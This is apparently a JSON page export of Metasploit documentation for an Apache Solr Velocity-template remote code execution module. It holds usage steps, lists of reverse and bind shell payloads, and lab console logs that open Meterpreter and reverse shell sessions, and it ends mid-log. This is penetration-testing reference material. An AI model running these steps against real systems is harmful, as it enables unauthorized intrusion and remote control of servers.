{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/multi/http/solr_velocity_rce","result":{"data":{"moduleMetadataJson":{"id":"9d36777a-51f5-5a93-9005-ee45bb1a3d89","name":"Apache Solr Remote Code Execution via Velocity Template","fullname":"exploit/multi/http/solr_velocity_rce","description":"This module exploits a vulnerability in Apache Solr <= 8.3.0 which allows remote code execution via a custom\n          Velocity template. Currently, this module only supports Solr basic authentication.\n\n          From the Tenable advisory:\n          An attacker could target a vulnerable Apache Solr instance by first identifying a list\n          of Solr core names. Once the core names have been identified, an attacker can send a specially crafted\n          HTTP POST request to the Config API to toggle the params resource loader value for the Velocity Response\n          Writer in the solrconfig.xml file to true. Enabling this parameter would allow an attacker to use the Velocity\n          template parameter in a specially crafted Solr request, leading to RCE.","rank":600,"fields":{"detailsSlug":"/modules/details/exploit/multi/http/solr_velocity_rce","documentationSlug":"/modules/documentation/exploit/multi/http/solr_velocity_rce","referencesSlug":"/modules/references/exploit/multi/http/solr_velocity_rce"},"documentation":{"html":"<h2 id=\"description\" style=\"position:relative;\"><a href=\"#description\" aria-label=\"description permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Description</h2>\n<p>This module exploits a vulnerability in Apache Solr &#x3C;= 8.3.0 which allows remote code execution via a custom\nVelocity template. Currently, this module only supports Solr basic authentication.</p>\n<p><strong>From the Tenable advisory</strong></p>\n<p>Link: <a href=\"https://www.tenable.com/blog/apache-solr-vulnerable-to-remote-code-execution-zero-day-vulnerability\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">https://www.tenable.com/blog/apache-solr-vulnerable-to-remote-code-execution-zero-day-vulnerability</a></p>\n<p>An attacker could target a vulnerable Apache Solr instance by first\nidentifying a list of Solr core names. Once the core names have been\nidentified, an attacker can send a specially crafted HTTP POST request\nto the Config API to toggle the params resource loader value for the\nVelocity Response Writer in the solrconfig.xml file to true. Enabling\nthis parameter would allow an attacker to use the Velocity template\nparameter in a specially crafted Solr request, leading to RCE.</p>\n<h2 id=\"vulnerable-applications\" style=\"position:relative;\"><a href=\"#vulnerable-applications\" aria-label=\"vulnerable applications permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Applications</h2>\n<p>Apache Solr &#x3C;= 8.3.0</p>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<ol>\n<li>Start <code class=\"language-text\">msfconsole</code></li>\n<li><code class=\"language-text\">use exploit/multi/http/solr_velocity_rce</code></li>\n<li><code class=\"language-text\">set RHOST &lt;target_ip&gt;</code></li>\n<li><code class=\"language-text\">set RPORT &lt;target_port&gt;</code></li>\n<li><code class=\"language-text\">set USERNAME &lt;username&gt;</code> (if applicable)</li>\n<li><code class=\"language-text\">set PASSWORD &lt;password&gt;</code> (if applicable)</li>\n<li>Ideally run <code class=\"language-text\">check</code></li>\n<li><code class=\"language-text\">set TARGET</code> based on output of <code class=\"language-text\">check</code></li>\n<li><code class=\"language-text\">set PAYLOAD &lt;payload_name&gt;</code> if you want to use other payloads</li>\n<li><code class=\"language-text\">set LHOST &lt;your_ip&gt;</code></li>\n<li><code class=\"language-text\">set LPORT &lt;your_port&gt;</code></li>\n<li>Optional: <code class=\"language-text\">set VERBOSE true</code> to get verbose output</li>\n<li>Optional: <code class=\"language-text\">set TARGETURI &lt;path_to_solr&gt;</code> if target system uses a different path to Apache Solr</li>\n<li><code class=\"language-text\">exploit</code> and let the shells rain</li>\n</ol>\n<h2 id=\"considerations\" style=\"position:relative;\"><a href=\"#considerations\" aria-label=\"considerations permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Considerations</h2>\n<p>Privileges gained are dependent on the user running Solr. Currently,\nthis module only supports basic auth.</p>\n<p>Windows systems have 3 targets:</p>\n<ol>\n<li>x86/64 Windows PowerShell: Uses <code class=\"language-text\">PowerShell</code> to get a shell. Payload defaults to <code class=\"language-text\">windows/meterpreter/reverse_tcp</code></li>\n<li>x86/64 Windows CmdStager: Uses <code class=\"language-text\">CmdStager</code> to get a shell. Payload defaults to <code class=\"language-text\">windows/meterpreter/reverse_tcp</code></li>\n<li>Windows Exec: Executes a command and returns the output. Payload defaults to <code class=\"language-text\">cmd/windows/generic</code></li>\n</ol>\n<p>*nix systems have 2 targets:</p>\n<ol>\n<li>Unix (in memory): Uses command execution. Payload defaults to <code class=\"language-text\">cmd/unix/reverse_bash</code>. Output may be returned depending on payload used.</li>\n<li>Linux (dropper): Uses <code class=\"language-text\">CmdStager</code>. Payload defaults to <code class=\"language-text\">linux/x86/meterpreter/reverse_tcp</code></li>\n</ol>\n<p>Some <code class=\"language-text\">cmd/unix</code> payloads do not work due to a quoting problem: the entire command in the Velocity template is single-quoted\nfor the convenience of <code class=\"language-text\">CmdStager</code>. Some <code class=\"language-text\">cmd/unix</code> are single-quoted, so this breaks the Velocity template.</p>\n<p>The full list of <code class=\"language-text\">cmd/unix</code> payloads that do not work due to the quoting problem are listed below:</p>\n<ol>\n<li>cmd/unix/bind_awk</li>\n<li>cmd/unix/bind_lua</li>\n<li>cmd/unix/bind_nodejs</li>\n<li>cmd/unix/bind_r</li>\n<li>cmd/unix/bind_ruby</li>\n<li>cmd/unix/bind<em>socat</em>udp</li>\n<li>cmd/unix/reverse_awk</li>\n<li>cmd/unix/reverse_lua</li>\n<li>cmd/unix/reverse_nodejs</li>\n<li>cmd/unix/reverse_perl</li>\n<li>cmd/unix/reverse<em>perl</em>ssl</li>\n<li>cmd/unix/reverse<em>php</em>ssl</li>\n<li>cmd/unix/reverse_python</li>\n<li>cmd/unix/reverse<em>python</em>ssl</li>\n<li>cmd/unix/reverse_r</li>\n<li>cmd/unix/reverse_ruby</li>\n<li>cmd/unix/reverse<em>ruby</em>ssl</li>\n<li>cmd/unix/reverse<em>socat</em>udp</li>\n<li>generic/shell<em>bind</em>tcp</li>\n<li>generic/shell<em>reverse</em>tcp</li>\n</ol>\n<p>The full list of <code class=\"language-text\">cmd/unix</code> payloads that work:</p>\n<ol>\n<li>cmd/unix/bind_netcat</li>\n<li>cmd/unix/bind<em>netcat</em>gaping</li>\n<li>cmd/unix/bind_perl</li>\n<li>cmd/unix/bind_zsh</li>\n<li>cmd/unix/generic</li>\n<li>cmd/unix/pingback_bind</li>\n<li>cmd/unix/pingback_reverse</li>\n<li>cmd/unix/reverse</li>\n<li>cmd/unix/reverse_bash</li>\n<li>cmd/unix/reverse<em>bash</em>udp</li>\n<li>cmd/unix/reverse_ksh</li>\n<li>cmd/unix/reverse_openssl</li>\n<li>cmd/unix/reverse<em>ncat</em>ssl</li>\n<li>cmd/unix/reverse_netcat</li>\n<li>cmd/unix/reverse<em>netcat</em>gaping</li>\n<li>cmd/unix/reverse_zsh</li>\n</ol>\n<p>These <code class=\"language-text\">cmd/unix</code> payloads have not fully tested with this module:</p>\n<ol>\n<li>cmd/unix/bind<em>busybox</em>telnetd</li>\n<li>cmd/unix/bind<em>netcat</em>gaping_ipv6</li>\n<li>cmd/unix/bind<em>perl</em>ipv6</li>\n<li>cmd/unix/bind<em>ruby</em>ipv6</li>\n<li>cmd/unix/reverse<em>bash</em>telnet_ssl</li>\n<li>cmd/unix/reverse<em>ssl</em>double_telnet</li>\n</ol>\n<p>These <code class=\"language-text\">cmd/unix</code> payloads have not been tested:</p>\n<ol>\n<li>cmd/unix/bind_stub</li>\n<li>cmd/unix/reverse_stub</li>\n<li>generic/custom</li>\n</ol>\n<h2 id=\"examples\" style=\"position:relative;\"><a href=\"#examples\" aria-label=\"examples permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Examples</h2>\n<h3 id=\"windows-server-2019-datacenter-fully-patched-solr-830-no-authentication-using-powershell\" style=\"position:relative;\"><a href=\"#windows-server-2019-datacenter-fully-patched-solr-830-no-authentication-using-powershell\" aria-label=\"windows server 2019 datacenter fully patched solr 830 no authentication using powershell permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Windows Server 2019 Datacenter, fully patched, Solr 8.3.0, no authentication, using PowerShell</h3>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 &gt; use exploit/multi/http/solr_velocity_rce\nmsf5 exploit(multi/http/solr_velocity_rce) &gt; set RHOSTS 192.168.137.155\nRHOSTS =&gt; 192.168.137.132\nmsf5 exploit(multi/http/solr_velocity_rce) &gt; set LHOST 192.168.137.128\nLHOST =&gt; 192.168.137.128\nmsf5 exploit(multi/http/solr_velocity_rce) &gt; set LPORT 4444\nLPORT =&gt; 4444\nmsf5 exploit(multi/http/solr_velocity_rce) &gt; set TARGET 2\nTARGET =&gt; 2\nmsf5 exploit(multi/http/solr_velocity_rce) &gt; exploit\n\n[*] Started reverse TCP handler on 192.168.137.128:4444 \n[*] Found Apache Solr 8.3.0\n[*] OS version is Windows Server 2019 amd64 10.0\n[*] Found core(s): techproducts\n[*] Targeting core &#39;techproducts&#39;\n[+] Found Powershell at C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\\n[*] Sending stage (180291 bytes) to 192.168.137.155\n[*] Meterpreter session 1 opened (192.168.137.128:4444 -&gt; 192.168.137.155:50210) at 2020-03-29 00:04:01 +0800\n\nmeterpreter &gt; sysinfo\nComputer        : 2K19DTCTR\nOS              : Windows 2016+ (10.0 Build 17763).\nArchitecture    : x64\ngSystem Language : en_US\nDomain          : WORKGROUP\nLogged On Users : 1\nMeterpreter     : x86/windows\nmeterpreter &gt;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h3 id=\"windows-server-2019-datacenter-fully-patched-solr-830-no-authentication-using-cmdstager\" style=\"position:relative;\"><a href=\"#windows-server-2019-datacenter-fully-patched-solr-830-no-authentication-using-cmdstager\" aria-label=\"windows server 2019 datacenter fully patched solr 830 no authentication using cmdstager permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Windows Server 2019 Datacenter, fully patched, Solr 8.3.0, no authentication, using CmdStager</h3>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 &gt; use exploit/multi/http/solr_velocity_rce \nmsf5 exploit(multi/http/solr_velocity_rce) &gt; set RHOSTS 192.168.137.155\nRHOSTS =&gt; 192.168.137.132\nmsf5 exploit(multi/http/solr_velocity_rce) &gt; set LHOST 192.168.137.128\nLHOST =&gt; 192.168.137.128\nmsf5 exploit(multi/http/solr_velocity_rce) &gt; set LPORT 4444\nLPORT =&gt; 4444\nmsf5 exploit(multi/http/solr_velocity_rce) &gt; set TARGET 3\nTARGET =&gt; 3\nmsf5 exploit(multi/http/solr_velocity_rce) &gt; exploit\n\n[*] Started reverse TCP handler on 192.168.137.128:4444 \n[*] Found Apache Solr 8.3.0\n[*] OS version is Windows Server 2019 amd64 10.0\n[*] Found core(s): techproducts\n[*] Targeting core &#39;techproducts&#39;\n[*] Sending CmdStager payload...\n[*] Command Stager progress -   7.05% done (7160/101541 bytes)\n[*] Command Stager progress -  14.10% done (14320/101541 bytes)\n[*] Command Stager progress -  21.15% done (21480/101541 bytes)\n[*] Command Stager progress -  28.21% done (28640/101541 bytes)\n[*] Command Stager progress -  35.26% done (35800/101541 bytes)\n[*] Command Stager progress -  42.31% done (42960/101541 bytes)\n[*] Command Stager progress -  49.36% done (50120/101541 bytes)\n[*] Command Stager progress -  56.41% done (57280/101541 bytes)\n[*] Command Stager progress -  63.46% done (64440/101541 bytes)\n[*] Command Stager progress -  70.51% done (71600/101541 bytes)\n[*] Command Stager progress -  77.56% done (78760/101541 bytes)\n[*] Command Stager progress -  84.62% done (85920/101541 bytes)\n[*] Command Stager progress -  91.67% done (93080/101541 bytes)\n[*] Command Stager progress -  98.67% done (100188/101541 bytes)\n[*] Sending stage (180291 bytes) to 192.168.137.155\n[*] Command Stager progress - 100.00% done (101541/101541 bytes)\n[*] Meterpreter session 2 opened (192.168.137.128:4444 -&gt; 192.168.137.155:50211) at 2020-03-29 00:06:01 +0800\n\nmeterpreter &gt; sysinfo\nComputer        : 2K19DTCTR\nOS              : Windows 2016+ (10.0 Build 17763).\nArchitecture    : x64\nSystem Language : en_US\nDomain          : WORKGROUP\nLogged On Users : 1\nMeterpreter     : x86/windows\nmeterpreter &gt; </code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h3 id=\"windows-server-2019-datacenter-fully-patched-solr-830-no-authentication-with-payload-cmdwindowsgeneric\" style=\"position:relative;\"><a href=\"#windows-server-2019-datacenter-fully-patched-solr-830-no-authentication-with-payload-cmdwindowsgeneric\" aria-label=\"windows server 2019 datacenter fully patched solr 830 no authentication with payload cmdwindowsgeneric permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Windows Server 2019 Datacenter, fully patched, Solr 8.3.0, no authentication, with payload <code class=\"language-text\">cmd/windows/generic</code></h3>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 &gt; use exploit/multi/http/solr_velocity_rce \nmsf5 exploit(multi/http/solr_velocity_rce) &gt; set RHOSTS 192.168.137.155\nRHOSTS =&gt; 192.168.137.132\nmsf5 exploit(multi/http/solr_velocity_rce) &gt; set LHOST 192.168.137.128\nLHOST =&gt; 192.168.137.128\nmsf5 exploit(multi/http/solr_velocity_rce) &gt; set LPORT 4444\nLPORT =&gt; 4444\nmsf5 exploit(multi/http/solr_velocity_rce) &gt; set TARGET 4\nTARGET =&gt; 4\nmsf5 exploit(multi/http/solr_velocity_rce) &gt; set CMD whoami\nCMD =&gt; whoami\nmsf5 exploit(multi/http/solr_velocity_rce) &gt; exploit\n\n[*] Found Apache Solr 8.3.0\n[*] OS version is Windows Server 2019 amd64 10.0\n[*] Found core(s): techproducts\n[*] Targeting core &#39;techproducts&#39;\n[+] 2k19dtctr\\administrator\n[*] Exploit completed, but no session was created.\nmsf5 exploit(multi/http/solr_velocity_rce) &gt; </code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h3 id=\"bitnami-solr-vm-830-requiring-basic-authentication-command-execution-in-memory-with-payload-cmdunixreverse_bash\" style=\"position:relative;\"><a href=\"#bitnami-solr-vm-830-requiring-basic-authentication-command-execution-in-memory-with-payload-cmdunixreverse_bash\" aria-label=\"bitnami solr vm 830 requiring basic authentication command execution in memory with payload cmdunixreverse_bash permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Bitnami Solr VM 8.3.0, requiring basic authentication, command execution in-memory, with payload <code class=\"language-text\">cmd/unix/reverse_bash</code></h3>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 &gt; use exploit/multi/http/solr_velocity_rce \nmsf5 exploit(multi/http/solr_velocity_rce) &gt; set RHOSTS 192.168.137.129\nRHOSTS =&gt; 192.168.137.129\nmsf5 exploit(multi/http/solr_velocity_rce) &gt; set RPORT 80\nRPORT =&gt; 80\nmsf5 exploit(multi/http/solr_velocity_rce) &gt; set TARGET 0\nTARGET =&gt; 0\nmsf5 exploit(multi/http/solr_velocity_rce) &gt; set USERNAME user\nUSERNAME =&gt; user\nmsf5 exploit(multi/http/solr_velocity_rce) &gt; set PASSWORD j6lzH82e6Jc5\nPASSWORD =&gt; j6lzH82e6Jc5\nmsf5 exploit(multi/http/solr_velocity_rce) &gt; set LHOST 192.168.137.128\nLHOST =&gt; 192.168.137.128\nmsf5 exploit(multi/http/solr_velocity_rce) &gt; set LPORT 4444\nLPORT =&gt; 4444\nmsf5 exploit(multi/http/solr_velocity_rce) &gt; exploit\n\n[*] Started reverse TCP handler on 192.168.137.128:4444 \n[*] Found Apache Solr 8.3.0\n[*] OS version is Linux amd64 4.9.0-11-amd64\n[*] Found core(s): techproducts\n[*] Targeting core &#39;techproducts&#39;\n[*] Command shell session 17 opened (192.168.137.128:4444 -&gt; 192.168.137.129:48600) at 2020-03-29 00:20:50 +0800\n\nid\nuid=999(solr) gid=1002(solr) groups=1002(solr)</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h3 id=\"bitnami-solr-vm-830-requiring-basic-authentication-command-execution-in-memory-with-payload-cmdunixgeneric\" style=\"position:relative;\"><a href=\"#bitnami-solr-vm-830-requiring-basic-authentication-command-execution-in-memory-with-payload-cmdunixgeneric\" aria-label=\"bitnami solr vm 830 requiring basic authentication command execution in memory with payload cmdunixgeneric permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Bitnami Solr VM 8.3.0, requiring basic authentication, command execution in-memory, with payload <code class=\"language-text\">cmd/unix/generic</code></h3>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 &gt; use exploit/multi/http/solr_velocity_rce \nmsf5 exploit(multi/http/solr_velocity_rce) &gt; set RHOSTS 192.168.137.129\nRHOSTS =&gt; 192.168.137.129\nmsf5 exploit(multi/http/solr_velocity_rce) &gt; set RPORT 80\nRPORT =&gt; 80\nmsf5 exploit(multi/http/solr_velocity_rce) &gt; set TARGET 0\nTARGET =&gt; 0\nmsf5 exploit(multi/http/solr_velocity_rce) &gt; set USERNAME user\nUSERNAME =&gt; user\nmsf5 exploit(multi/http/solr_velocity_rce) &gt; set PASSWORD j6lzH82e6Jc5\nPASSWORD =&gt; j6lzH82e6Jc5\nmsf5 exploit(multi/http/solr_velocity_rce) &gt; set LHOST 192.168.137.128\nLHOST =&gt; 192.168.137.128\nmsf5 exploit(multi/http/solr_velocity_rce) &gt; set LPORT 4444\nLPORT =&gt; 4444\nmsf5 exploit(multi/http/solr_velocity_rce) &gt; set CMD whoami\nCMD =&gt; whoami\nmsf5 exploit(multi/http/solr_velocity_rce) &gt; exploit\n\n[*] Started reverse TCP handler on 192.168.137.128:4444 \n[*] Found Apache Solr 8.3.0\n[*] OS version is Linux amd64 4.9.0-11-amd64\n[*] Found core(s): techproducts\n[*] Targeting core &#39;techproducts&#39;\n[+] solr\n[*] Exploit completed, but no session was created.\nmsf5 exploit(multi/http/solr_velocity_rce) &gt; </code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h3 id=\"bitnami-solr-vm-830-requiring-basic-authentication-using-cmdstager-with-payload-linuxx86meterpreterreverse_tcp\" style=\"position:relative;\"><a href=\"#bitnami-solr-vm-830-requiring-basic-authentication-using-cmdstager-with-payload-linuxx86meterpreterreverse_tcp\" aria-label=\"bitnami solr vm 830 requiring basic authentication using cmdstager with payload linuxx86meterpreterreverse_tcp permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Bitnami Solr VM 8.3.0, requiring basic authentication, using CmdStager, with payload <code class=\"language-text\">linux/x86/meterpreter/reverse_tcp</code></h3>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 &gt; use exploit/multi/http/solr_velocity_rce \nmsf5 exploit(multi/http/solr_velocity_rce) &gt; set RHOSTS 192.168.137.129\nRHOSTS =&gt; 192.168.137.129\nmsf5 exploit(multi/http/solr_velocity_rce) &gt; set RPORT 80\nRPORT =&gt; 80\nmsf5 exploit(multi/http/solr_velocity_rce) &gt; set USERNAME user\nUSERNAME =&gt; user\nmsf5 exploit(multi/http/solr_velocity_rce) &gt; set PASSWORD j6lzH82e6Jc5\nPASSWORD =&gt; j6lzH82e6Jc5\nmsf5 exploit(multi/http/solr_velocity_rce) &gt; set TARGET 1\nTARGET =&gt; 1\nmsf5 exploit(multi/http/solr_velocity_rce) &gt; set LHOST 192.168.137.128\nLHOST =&gt; 192.168.137.128\nmsf5 exploit(multi/http/solr_velocity_rce) &gt; set LPORT 4444\nLPORT =&gt; 4444\nmsf5 exploit(multi/http/solr_velocity_rce) &gt; exploit\n\n[*] Started reverse TCP handler on 192.168.137.128:4444 \n[*] Found Apache Solr 8.3.0\n[*] OS version is Linux amd64 4.9.0-11-amd64\n[*] Found core(s): techproducts\n[*] Targeting core &#39;techproducts&#39;\n[*] Using URL: 